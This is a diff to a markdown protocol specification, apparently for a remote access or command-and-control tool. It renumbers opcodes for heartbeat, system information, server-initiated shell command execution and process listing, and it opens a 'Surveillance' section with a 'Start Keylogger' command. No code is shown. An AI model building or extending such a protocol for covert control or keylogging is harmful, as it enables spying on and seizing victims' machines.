@@ -19,12 +19,14 @@ struct PacketHeader {
 
 ## 3. Opcodes (Commands & Events)
 ### System & Control
-- `0x0001` : System Information Request (Server -> Client)
-- `0x0002` : System Information Response (Client -> Server)
-- `0x0003` : Execute Shell Command (Server -> Client)
-- `0x0004` : Shell Command Output (Client -> Server)
-- `0x0006` : Process List Request (Server -> Client)
-- `0x0007` : Paged Process List Response (Client -> Server)
+- `0x0000` : PING — Heartbeat request (Server -> Client)
+- `0x0001` : PONG — Heartbeat response (Client -> Server)
+- `0x0002` : SYS_REQ_INFO — System Information Request (Server -> Client)
+- `0x0003` : SYS_RES_INFO — System Information Response (Client -> Server)
+- `0x0004` : CMD_EXEC — Execute Shell Command (Server -> Client)
+- `0x0005` : CMD_RES — Shell Command Output, chunked (Client -> Server)
+- `0x0006` : PROC_LIST_REQ — Process List Request (Server -> Client)
+- `0x0007` : PROC_LIST_RES — Paged Process List Response (Client -> Server)
 
 ### Surveillance (Gourmandise)
 - `0x0100` : Start Keylogger (Server -> Client)
